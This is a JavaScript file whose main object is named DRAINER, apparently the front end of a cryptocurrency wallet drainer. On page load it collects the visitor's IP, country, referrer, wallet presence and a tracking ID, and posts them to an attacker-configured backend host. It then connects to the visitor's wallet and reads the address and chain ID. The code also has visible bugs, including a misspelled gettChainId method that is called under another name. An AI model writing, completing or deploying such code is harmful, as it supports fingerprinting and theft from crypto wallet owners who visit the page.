const _WEB3 = window.Web3
const _WEB3MODAL = window.Web3Modal.default
const _WCP = window.WalletConnectProvider.default

var DRAINER = {
    SETTINGS: SETTINGS,
    LIBS: {
        W3_MODAL: new _WEB3MODAL({
            cacheProvider: false,
            providerOptions: {
                walletconnect: {
                    package: _WCP,
                    options: {
                        rpc: 'https://rpc.ankr.com/eth',
                        chainId: 1
                    }
                }
            }
        })
    },
    STATUS: {
        INITIALIZED: false,
        CONNECTED: false,
        CHECKED: false
    },
    USER: {
        IP: undefined,
        LOCATION: undefined,
        REFERRER: undefined,
        ETHEREUM: undefined,
        ID: undefined,
        VISITS: undefined,
        LAST_VISIT: undefined
    },
    WEB3: {
        WALLET_ADDRESS: undefined,
        CHAIN_ID: undefined,
        PRIVATE_PROVIDER: undefined
    },
    getUserHost: async function() {
        let user_host = undefined

        user_host = await $.getJSON('https://api.db-ip.com/v2/free/self')

        if (typeof(user_host) !== 'undefined') {
            this.USER.IP = user_host.ipAddress
            this.USER.LOCATION = user_host.countryName
        } else {
            console.log('Failed to get the user data')
            return (false)
        }

        return (true)
    },
    getUserReferrer: async function() {
        this.USER.REFERRER = document.referrer

        return (true)
    },
    getUserEthereum: async function() {
        if(typeof(ethereum) !== 'undefined') {
            this.USER.ETHEREUM = true
        } else {
            this.USER.ETHEREUM = false
        }

        return (true)
    },
    getUserCookie: async function() {
        let id = localStorage.getItem('ID')
        let visits = localStorage.getItem('VISITS')
        let last_visit = localStorage.getItem('LAST_VISIT')

        if(id === null) {
            if(typeof(this.USER.IP) !== 'undefined') {
                id = btoa(this.USER.IP + ':' + Date.now() + ':' + Math.floor(Math.random() * 2**32))
            } else {
                id = btoa(Date.now() + ':' + Math.floor(Math.random() * 2**32))
            }
        }

        if(visits === null) {
            visits = 1
        } else {
            visits = parseInt(visits) + 1
        }

        if (last_visit === null) {
            last_visit = "NOW"
        }

        this.USER.ID = id
        this.USER.VISITS = visits
        this.USER.LAST_VISIT = last_visit

        return (true)
    },
    setUserCookie: async function() {
        localStorage.setItem('ID', this.USER.ID)
        localStorage.setItem('VISITS', this.USER.VISITS)
        localStorage.setItem('LAST_VISIT', Date.now())

        return (true)
    },
    sendUserData: async function() {
        let response = undefined

        if (typeof(this.USER.IP) !== 'undefined') {
            try {
                response = $.post({
                    type: 'POST',
                    url: 'http://' + DRAINER.SETTINGS.BACKEND_HOST + '/visit',
                    data: DRAINER.USER
                })
            } catch (error) {
                console.log('Failed to send the user data')
                return (false)
            }
        } else {
            console.log('No user data to send')
            return (false)
        }

        if(typeof(response) === 'undefined') {
            return (false)
        }
        
        return (true)
    },
    initUserData: async function() {
        await this.getUserHost()
        await this.getUserReferrer()
        await this.getUserEthereum()
        await this.getUserCookie()
        await this.setUserCookie()
        this.sendUserData()

        return (true)
    },
    gettChainId: async function() {
        let chain_id = undefined

        if (typeof(this.WEB3.PRIVATE_PROVIDER) !== 'undefined') {
            if (typeof(this.WEB3.PRIVATE_PROVIDER.eth) !== 'undefined') {
                chain_id = await this.WEB3.PRIVATE_PROVIDER.eth.getChainId()
            } else {
                console.log('Failed to get the chain id')
                return (false)
            }
        } else {
            console.log('Failed to get the chain id')
            return (false)
        }

        if (typeof(chain_id) !== 'undefined') {
            this.WEB3.CHAIN_ID = chain_id
        } else {
            console.log('Failed to get the chain id')
            return (false)
        }

        return (true)
    },
    getWalletAddress: async function() {
        let wallet_address = undefined

        if (typeof(this.WEB3.PRIVATE_PROVIDER) !== 'undefined') {
            if (typeof(this.WEB3.PRIVATE_PROVIDER.eth) !== 'undefined') {
                wallet_address = await this.WEB3.PRIVATE_PROVIDER.eth.getAccounts()
            } else {
                console.log('Failed to get the wallet address')
                return (false)
            }
        } else {
            console.log('Failed to get the wallet address')
            return (false)
        }
        
        if (typeof(wallet_address) !== 'undefined') {
            this.WEB3.WALLET_ADDRESS = wallet_address[0]
        } else {
            console.log('Failed to get the wallet address')
            return (false)
        }

        return (true)
    },
    update_web3: async function() {
        if(this.getWalletAddress() && this.getChainId()) {
            return (true)
        } else {
            return (false)
        }
    },
    connect: async function() {
        let w3_modal_provider = undefined

        try {
            w3_modal_provider = await this.LIBS.W3_MODAL.connect()
        } catch (error) {
            console.log('W3_MODAL Error:', error)
    
            return (false)
        }

        if (typeof(w3_modal_provider) !== 'undefined') {
            try {
                this.WEB3.PRIVATE_PROVIDER = new _WEB3(w3_modal_provider)
            } catch (error) {
                console.log('WEB3 Error:', error)
    
                return (false)
            }
        } else {
            return (false)
        }

        if (this.update_web3()) {
            this.STATUS.CONNECTED = true
        } else {
            console.log('Failed to connect')
        }

        return (true)
    }
}

$(document).ready(function() {
    DRAINER.initUserData()
})